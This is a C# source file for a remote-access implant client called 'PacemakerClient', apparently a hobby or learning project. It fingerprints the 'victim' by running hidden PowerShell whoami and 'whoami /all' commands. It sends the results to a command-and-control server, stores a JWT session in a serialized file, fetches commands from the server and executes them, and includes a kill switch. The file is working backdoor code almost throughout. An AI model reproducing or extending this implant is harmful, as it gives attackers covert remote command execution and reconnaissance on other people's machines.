using System;
using System.IO;
using System.Linq;
using System.Text;
using Newtonsoft.Json;
using PacemakerClient;
using System.Net.Http;
using System.Threading;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Runtime.Serialization.Formatters.Binary; 

namespace PacemakerClient_cli
{
    public class InitialHandshakeJson
    {
        public string victimName {  get; set; }
        public string victimAdditionalinfo { get; set;}
    }

    internal class Program
    {
        public static string server_hostname = "http://localhost:3000";
        public static BinaryFormatter MainBinaryForammatter;
        public static AuthCore authObj;
        static Stream file_stream;

        public async static Task InitialHandshake()
        {
            HttpClient Client = new HttpClient();

            InitialHandshakeJson initialHandshakejson = new InitialHandshakeJson
            {
                victimName = GetInitialUserInformation("name"),
                victimAdditionalinfo = GetInitialUserInformation("description")
            };


            string output = JsonConvert.SerializeObject(initialHandshakejson);

            var content = new StringContent(output, Encoding.UTF8, "application/json");

            var json = await Client.PutAsync(server_hostname + "/core/initialhandshake", content);

            string jsonResponse;

            if (json.IsSuccessStatusCode)
            {
                jsonResponse = await json.Content.ReadAsStringAsync();

                authObj = JsonConvert.DeserializeObject<AuthCore>(jsonResponse);

                MainBinaryForammatter = new BinaryFormatter();
                Stream stream1;
                stream1 = File.Open("authObject.dat", FileMode.Open);       // serializing auth object
                MainBinaryForammatter.Serialize(stream1, authObj);
                stream1.Close();

            }
            else
            {
                await KillSwitch();
            }
        }

        public async static Task<CmdResult> GetAndRunCmd()
        {
            HttpClient Client = new HttpClient();

            string jsonData = "{\"username\": \"" + authObj.Username + "\", \"jwt_key\": \"" + authObj.JwtToken + "\"}";

            var content = new StringContent(jsonData, Encoding.UTF8, "application/json");

            var response = await Client.PostAsync(server_hostname + "/core/getcmd", content);

            Cmd cmdObj;
            CmdResult resultObj = new CmdResult();

            if (response.IsSuccessStatusCode)
            {
                string jsonString = await response.Content.ReadAsStringAsync();
                cmdObj = JsonConvert.DeserializeObject<Cmd>(jsonString);


                if (cmdObj.active && cmdObj.command.Length > 0)
                {
                    string result = cmdObj.RunCmd();
                    resultObj.result = result;
                    resultObj.username = authObj.Username;
                    resultObj.jwt_key = authObj.JwtToken;
                    resultObj.commandId = cmdObj.commandId;
                }
            }else if (response.StatusCode == System.Net.HttpStatusCode.Unauthorized)
            {
                await authObj.refresh();
                await GetAndRunCmd();
            }

            return resultObj;
        }

        public static string GetInitialUserInformation(string option)
        {

            Process process = new Process();
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = false;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            

            if (option == "name")
            {
                process.Start();
                process.StandardInput.WriteLine("whoami > result.txt");
                process.StandardInput.Flush();
                process.StandardInput.Close();
                process.WaitForExit();
            }
            else
            {
                process.Start();
                process.StandardInput.WriteLine("whoami /all > result.txt");
                process.StandardInput.Flush();
                process.StandardInput.Close();
                process.WaitForExit();
            }

            if (File.Exists("result.txt"))
            {

                StreamReader sr = new StreamReader(Environment.CurrentDirectory + "\\result.txt");
                // read everything from file
                string result = sr.ReadToEnd();

                sr.Close();

                return result;

            }
            else
            {
                return "result file not created !";
            }
        }


        public async static Task KillSwitch()
        {
            HttpClient Client = new HttpClient();

            string jsonData = "{\"username\": \"" + authObj.Username + "\", \"jwt_key\": \"" + authObj.JwtToken + "\"}";

            var content = new StringContent(jsonData, Encoding.UTF8, "application/json");

            var json = await Client.PostAsync(server_hostname + "/core/killswitch", content);

            string fullPath = Environment.CurrentDirectory + "\\killed.txt";

            using (StreamWriter writer = new StreamWriter(fullPath))
            {
                var jsonResponse = await json.Content.ReadAsStringAsync();
                writer.WriteLine(jsonResponse.ToString());
                writer.WriteLine(json.ToString());
                writer.WriteLine("\n\nVictim was killed...");
            }

            return;
        }

        static async Task Main(string[] args)
        {

            if (File.Exists("authObject.dat"))
            {
                try
                {
                    BinaryFormatter MainBinaryForammatter5 = new BinaryFormatter();                           ///
                    Stream stream2;                                                        /// 
                    stream2 = File.Open("authObject.dat", FileMode.Open);
                    authObj = (AuthCore)MainBinaryForammatter5.Deserialize(stream2);                         /// 
                    stream2.Close();

                }catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    await InitialHandshake();
                    Console.WriteLine("Finished authenticating");
                }
               
            }
            else
            {
                file_stream = File.Create("authObject.dat");
                file_stream.Close();

                await InitialHandshake();
        
                Console.WriteLine("Finished authenticating");
            }


            Console.WriteLine("\nDoing something....\n");
            Thread.Sleep(2000);
           
            await KillSwitch();

            Console.WriteLine("Done");
        }
    }
}
